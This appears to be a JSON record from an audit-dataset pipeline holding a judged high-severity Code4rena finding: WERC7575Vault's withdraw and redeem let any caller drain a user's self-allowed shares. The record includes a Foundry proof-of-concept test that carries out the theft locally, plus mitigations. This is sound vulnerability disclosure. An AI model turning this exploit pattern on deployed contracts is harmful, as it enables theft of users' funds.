@@ -1,0 +1,120 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "XhFXFVuX35o",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "XhFXFVuX35o",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_XhFXFVuX35o.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "XhFXFVuX35o",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Anyone can withdraw another user’s funds from `WERC7575Vault` once self-allowance is enabled",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "grigorovv",
+  "body": "## Finding description\n\nIn the `WERC7575Vault` contract the `withdraw()` and `redeem()` functions allow the caller to specify an arbitrary owner whose shares will be burned and used to withdraw the corresponding assets to another address (likely malicious caller). There exists no check that `msg.sender == owner` or `msg.sender` was approved to withdraw on `owner`'s behalf, instead the vault only calls\n```solidity\n_shareToken.spendSelfAllowance(owner, shares);\n```\n`spendSelfAllowance(owner, shares)` itself only checks `allowance[owner][owner]` - the self-allowance, not approval for the attacker. Once a validator signs a permit enabling a user’s self-allowance (required for normal usage), anyone can call `vault.withdraw(assets, attacker, victim)`, burning `victim` user's shares and getting the assets tied to them sent to `attacker`.\n\n## Impact\n\nAn attacker can use 100% of the self-allowed shares the victim has to withdraw assets from any `WERC7575Vault`. By using either of the `withdraw()` and `redeem()` functions, the attacker will:\n- Burn the victim’s shares\n- Withdraw the underlying assets to themselves\n- Leave the victim with a zero balance, with no way to recover what was lost.\n\n## Severity Explanation\n\nThis enables complete theft of any user’s vault balance by any external attacker, without permission, without cost. No special conditions are needed other than the user having an active self-allowance (which is part of the normal flow of the protocol). The attacker fully drains the user’s position (or as much as they have self-allowed) in a single transaction.\n\n## Recommended mitigation steps\n\nEither:\n- Require `owner == msg.sender` inside `_withdraw()`\n```solidity\nif (msg.sender != owner) revert Unauthorized();\n```\n- Or rather check for standard ERC20 approvals:\n```solidity\nif (msg.sender != owner) {\n    shareToken.spendAllowance(owner, msg.sender, shares);\n} // it will revert if `owner` has not set `msg.sender`'s allowance\n```",
+  "proof_of_concept": "Paste this at the bottom of `AuditReproductionTest` inside `AuditReproduction.t.sol`\n```solidity\nfunction test_WERC7575Vault_AllowsAnyoneToWithdrawOnBehalfOfOwner() public {\n    // -----------------------------\n    // 1. Deploy dedicated WERC7575 ShareToken + Vault for the PoC\n    // -----------------------------\n    WERC7575ShareToken wShare = new WERC7575ShareToken(\"Wrapped Share\", \"WSH\");\n    WERC7575Vault wVault = new WERC7575Vault(address(asset), wShare);\n\n    // Register vault in share token so it can mint/burn\n    wShare.registerVault(address(asset), address(wVault));\n\n    // Victim and attacker\n    address victim = user;                 // already defined as 0x1 in the fixture\n    address attacker = address(0xBEEF);\n\n    // -----------------------------\n    // 2. KYC victim and give them some assets\n    // -----------------------------\n    wShare.setKycVerified(victim, true);\n\n    // User already has 10000e18 asset from setUp().\n    // Approve vault and deposit 1000e18 as victim.\n    uint256 depositAmount = 1000e18;\n    vm.startPrank(victim);\n    asset.approve(address(wVault), type(uint256).max);\n    wVault.deposit(depositAmount, victim);\n    vm.stopPrank();\n\n    // Sanity: victim holds shares, vault holds assets\n    assertEq(wShare.balanceOf(victim), depositAmount, \"Victim should have vault shares\");\n    assertEq(asset.balanceOf(address(wVault)), depositAmount, \"Vault should hold victim assets\");\n\n    // -----------------------------\n    // 3. Validator grants victim self-allowance via permit(owner=spender=victim)\n    // -----------------------------\n    // Set validator to a key we control in the test\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    wShare.setValidator(validator);\n\n    uint256 nonce = wShare.nonces(victim);\n    uint256 deadline = block.timestamp + 1 days;\n\n    bytes32 domainSeparator = wShare.DOMAIN_SEPARATOR();\n    bytes32 PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    bytes32 structHash = keccak256(\n        abi.encode(\n            PERMIT_TYPEHASH,\n            victim,                 // owner\n            victim,                 // spender (SELF)\n            depositAmount,          // self-allowance = depositAmount\n            nonce,\n            deadline\n        )\n    );\n\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n    // Execute self-permit: allowance[victim][victim] = depositAmount\n    wShare.permit(victim, victim, depositAmount, deadline, v, r, s);\n    assertEq(wShare.allowance(victim, victim), depositAmount, \"Self-allowance should be set\");\n\n    // -----------------------------\n    // 4. ATTACK: attacker calls withdraw with owner=victim, receiver=attacker\n    // -----------------------------\n    uint256 assetsToSteal = wVault.maxWithdraw(victim); // should be 1000e18 (depositAmount)\n\n    // Attacker has no shares, though is about to withdraw \n    assertEq(wShare.balanceOf(attacker), 0, \"Attacker should have no vault shares\");\n    \n    vm.prank(attacker);\n    uint256 burnedShares = wVault.withdraw(assetsToSteal, attacker, victim);\n\n    // -----------------------------\n    // 5. Post-attack checks\n    // -----------------------------\n    // All victim shares burned\n    assertEq(burnedShares, depositAmount, \"All victim shares should be burned\");\n    assertEq(wShare.balanceOf(victim), 0, \"Victim shares should be zero after attack\");\n\n    // Attacker received the underlying assets\n    assertEq(asset.balanceOf(attacker), assetsToSteal, \"Attacker should receive stolen assets\");\n\n    // Vault no longer holds the victim assets\n    assertEq(asset.balanceOf(address(wVault)), 0, \"Vault should be drained for victim position\");\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L397-L437",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L464-L467"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "86",
+    "api_submission_id": "",
+    "uid": "XhFXFVuX35o",
+    "number": "86",
+    "title": "Anyone can withdraw another user’s funds from `WERC7575Vault` once self-allowance is enabled",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "grigorovv",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L397-L437",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L464-L467"
+    ],
+    "body": "## Finding description\n\nIn the `WERC7575Vault` contract the `withdraw()` and `redeem()` functions allow the caller to specify an arbitrary owner whose shares will be burned and used to withdraw the corresponding assets to another address (likely malicious caller). There exists no check that `msg.sender == owner` or `msg.sender` was approved to withdraw on `owner`'s behalf, instead the vault only calls\n```solidity\n_shareToken.spendSelfAllowance(owner, shares);\n```\n`spendSelfAllowance(owner, shares)` itself only checks `allowance[owner][owner]` - the self-allowance, not approval for the attacker. Once a validator signs a permit enabling a user’s self-allowance (required for normal usage), anyone can call `vault.withdraw(assets, attacker, victim)`, burning `victim` user's shares and getting the assets tied to them sent to `attacker`.\n\n## Impact\n\nAn attacker can use 100% of the self-allowed shares the victim has to withdraw assets from any `WERC7575Vault`. By using either of the `withdraw()` and `redeem()` functions, the attacker will:\n- Burn the victim’s shares\n- Withdraw the underlying assets to themselves\n- Leave the victim with a zero balance, with no way to recover what was lost.\n\n## Severity Explanation\n\nThis enables complete theft of any user’s vault balance by any external attacker, without permission, without cost. No special conditions are needed other than the user having an active self-allowance (which is part of the normal flow of the protocol). The attacker fully drains the user’s position (or as much as they have self-allowed) in a single transaction.\n\n## Recommended mitigation steps\n\nEither:\n- Require `owner == msg.sender` inside `_withdraw()`\n```solidity\nif (msg.sender != owner) revert Unauthorized();\n```\n- Or rather check for standard ERC20 approvals:\n```solidity\nif (msg.sender != owner) {\n    shareToken.spendAllowance(owner, msg.sender, shares);\n} // it will revert if `owner` has not set `msg.sender`'s allowance\n```",
+    "proof_of_concept": "Paste this at the bottom of `AuditReproductionTest` inside `AuditReproduction.t.sol`\n```solidity\nfunction test_WERC7575Vault_AllowsAnyoneToWithdrawOnBehalfOfOwner() public {\n    // -----------------------------\n    // 1. Deploy dedicated WERC7575 ShareToken + Vault for the PoC\n    // -----------------------------\n    WERC7575ShareToken wShare = new WERC7575ShareToken(\"Wrapped Share\", \"WSH\");\n    WERC7575Vault wVault = new WERC7575Vault(address(asset), wShare);\n\n    // Register vault in share token so it can mint/burn\n    wShare.registerVault(address(asset), address(wVault));\n\n    // Victim and attacker\n    address victim = user;                 // already defined as 0x1 in the fixture\n    address attacker = address(0xBEEF);\n\n    // -----------------------------\n    // 2. KYC victim and give them some assets\n    // -----------------------------\n    wShare.setKycVerified(victim, true);\n\n    // User already has 10000e18 asset from setUp().\n    // Approve vault and deposit 1000e18 as victim.\n    uint256 depositAmount = 1000e18;\n    vm.startPrank(victim);\n    asset.approve(address(wVault), type(uint256).max);\n    wVault.deposit(depositAmount, victim);\n    vm.stopPrank();\n\n    // Sanity: victim holds shares, vault holds assets\n    assertEq(wShare.balanceOf(victim), depositAmount, \"Victim should have vault shares\");\n    assertEq(asset.balanceOf(address(wVault)), depositAmount, \"Vault should hold victim assets\");\n\n    // -----------------------------\n    // 3. Validator grants victim self-allowance via permit(owner=spender=victim)\n    // -----------------------------\n    // Set validator to a key we control in the test\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    wShare.setValidator(validator);\n\n    uint256 nonce = wShare.nonces(victim);\n    uint256 deadline = block.timestamp + 1 days;\n\n    bytes32 domainSeparator = wShare.DOMAIN_SEPARATOR();\n    bytes32 PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    bytes32 structHash = keccak256(\n        abi.encode(\n            PERMIT_TYPEHASH,\n            victim,                 // owner\n            victim,                 // spender (SELF)\n            depositAmount,          // self-allowance = depositAmount\n            nonce,\n            deadline\n        )\n    );\n\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n    // Execute self-permit: allowance[victim][victim] = depositAmount\n    wShare.permit(victim, victim, depositAmount, deadline, v, r, s);\n    assertEq(wShare.allowance(victim, victim), depositAmount, \"Self-allowance should be set\");\n\n    // -----------------------------\n    // 4. ATTACK: attacker calls withdraw with owner=victim, receiver=attacker\n    // -----------------------------\n    uint256 assetsToSteal = wVault.maxWithdraw(victim); // should be 1000e18 (depositAmount)\n\n    // Attacker has no shares, though is about to withdraw \n    assertEq(wShare.balanceOf(attacker), 0, \"Attacker should have no vault shares\");\n    \n    vm.prank(attacker);\n    uint256 burnedShares = wVault.withdraw(assetsToSteal, attacker, victim);\n\n    // -----------------------------\n    // 5. Post-attack checks\n    // -----------------------------\n    // All victim shares burned\n    assertEq(burnedShares, depositAmount, \"All victim shares should be burned\");\n    assertEq(wShare.balanceOf(victim), 0, \"Victim shares should be zero after attack\");\n\n    // Attacker received the underlying assets\n    assertEq(asset.balanceOf(attacker), assetsToSteal, \"Attacker should receive stolen assets\");\n\n    // Vault no longer holds the victim assets\n    assertEq(asset.balanceOf(address(wVault)), 0, \"Vault should be drained for victim position\");\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/86",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-11-27T14:40:39.581Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "m7s88yb4Fdo",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T09:03:15.694Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "XhFXFVuX35o",
+          "findingUid": null
+        },
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Anyone can withdraw another user’s funds from `WERC7575Vault` once self-allowance is enabled",
+      "uid": "XhFXFVuX35o",
+      "updatedAt": "2025-11-27T14:40:39.581Z",
+      "user": {
+        "uid": "Je5cWCZMUVC",
+        "handle": "grigorovv"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description\n\nIn the `WERC7575Vault` contract the `withdraw()` and `redeem()` functions allow the caller to specify an arbitrary owner whose shares will be burned and used to withdraw the corresponding assets to another address (likely malicious caller). There exists no check that `msg.sender == owner` or `msg.sender` was approved to withdraw on `owner`'s behalf, instead the vault only calls\n```solidity\n_shareToken.spendSelfAllowance(owner, shares);\n```\n`spendSelfAllowance(owner, shares)` itself only checks `allowance[owner][owner]` - the self-allowance, not approval for the attacker. Once a validator signs a permit enabling a user’s self-allowance (required for normal usage), anyone can call `vault.withdraw(assets, attacker, victim)`, burning `victim` user's shares and getting the assets tied to them sent to `attacker`.\n\n## Impact\n\nAn attacker can use 100% of the self-allowed shares the victim has to withdraw assets from any `WERC7575Vault`. By using either of the `withdraw()` and `redeem()` functions, the attacker will:\n- Burn the victim’s shares\n- Withdraw the underlying assets to themselves\n- Leave the victim with a zero balance, with no way to recover what was lost.\n\n## Severity Explanation\n\nThis enables complete theft of any user’s vault balance by any external attacker, without permission, without cost. No special conditions are needed other than the user having an active self-allowance (which is part of the normal flow of the protocol). The attacker fully drains the user’s position (or as much as they have self-allowed) in a single transaction.\n\n## Recommended mitigation steps\n\nEither:\n- Require `owner == msg.sender` inside `_withdraw()`\n```solidity\nif (msg.sender != owner) revert Unauthorized();\n```\n- Or rather check for standard ERC20 approvals:\n```solidity\nif (msg.sender != owner) {\n    shareToken.spendAllowance(owner, msg.sender, shares);\n} // it will revert if `owner` has not set `msg.sender`'s allowance\n```",
+      "proofOfConcept": "Paste this at the bottom of `AuditReproductionTest` inside `AuditReproduction.t.sol`\n```solidity\nfunction test_WERC7575Vault_AllowsAnyoneToWithdrawOnBehalfOfOwner() public {\n    // -----------------------------\n    // 1. Deploy dedicated WERC7575 ShareToken + Vault for the PoC\n    // -----------------------------\n    WERC7575ShareToken wShare = new WERC7575ShareToken(\"Wrapped Share\", \"WSH\");\n    WERC7575Vault wVault = new WERC7575Vault(address(asset), wShare);\n\n    // Register vault in share token so it can mint/burn\n    wShare.registerVault(address(asset), address(wVault));\n\n    // Victim and attacker\n    address victim = user;                 // already defined as 0x1 in the fixture\n    address attacker = address(0xBEEF);\n\n    // -----------------------------\n    // 2. KYC victim and give them some assets\n    // -----------------------------\n    wShare.setKycVerified(victim, true);\n\n    // User already has 10000e18 asset from setUp().\n    // Approve vault and deposit 1000e18 as victim.\n    uint256 depositAmount = 1000e18;\n    vm.startPrank(victim);\n    asset.approve(address(wVault), type(uint256).max);\n    wVault.deposit(depositAmount, victim);\n    vm.stopPrank();\n\n    // Sanity: victim holds shares, vault holds assets\n    assertEq(wShare.balanceOf(victim), depositAmount, \"Victim should have vault shares\");\n    assertEq(asset.balanceOf(address(wVault)), depositAmount, \"Vault should hold victim assets\");\n\n    // -----------------------------\n    // 3. Validator grants victim self-allowance via permit(owner=spender=victim)\n    // -----------------------------\n    // Set validator to a key we control in the test\n    uint256 validatorPk = 0xA11CE;\n    address validator = vm.addr(validatorPk);\n    wShare.setValidator(validator);\n\n    uint256 nonce = wShare.nonces(victim);\n    uint256 deadline = block.timestamp + 1 days;\n\n    bytes32 domainSeparator = wShare.DOMAIN_SEPARATOR();\n    bytes32 PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    bytes32 structHash = keccak256(\n        abi.encode(\n            PERMIT_TYPEHASH,\n            victim,                 // owner\n            victim,                 // spender (SELF)\n            depositAmount,          // self-allowance = depositAmount\n            nonce,\n            deadline\n        )\n    );\n\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n    // Execute self-permit: allowance[victim][victim] = depositAmount\n    wShare.permit(victim, victim, depositAmount, deadline, v, r, s);\n    assertEq(wShare.allowance(victim, victim), depositAmount, \"Self-allowance should be set\");\n\n    // -----------------------------\n    // 4. ATTACK: attacker calls withdraw with owner=victim, receiver=attacker\n    // -----------------------------\n    uint256 assetsToSteal = wVault.maxWithdraw(victim); // should be 1000e18 (depositAmount)\n\n    // Attacker has no shares, though is about to withdraw \n    assertEq(wShare.balanceOf(attacker), 0, \"Attacker should have no vault shares\");\n    \n    vm.prank(attacker);\n    uint256 burnedShares = wVault.withdraw(assetsToSteal, attacker, victim);\n\n    // -----------------------------\n    // 5. Post-attack checks\n    // -----------------------------\n    // All victim shares burned\n    assertEq(burnedShares, depositAmount, \"All victim shares should be burned\");\n    assertEq(wShare.balanceOf(victim), 0, \"Victim shares should be zero after attack\");\n\n    // Attacker received the underlying assets\n    assertEq(asset.balanceOf(attacker), assetsToSteal, \"Attacker should receive stolen assets\");\n\n    // Vault no longer holds the victim assets\n    assertEq(asset.balanceOf(address(wVault)), 0, \"Vault should be drained for victim position\");\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L397-L437,https://github.com/code-423n4/2025-11-sukukfi/blob/163216500a54627afc6abaac3bffdc3a830051fa/src/WERC7575Vault.sol#L464-L467",
+      "number": 86,
+      "aiExplanation": null,
+      "_index": 86
+    }
+  }
+}
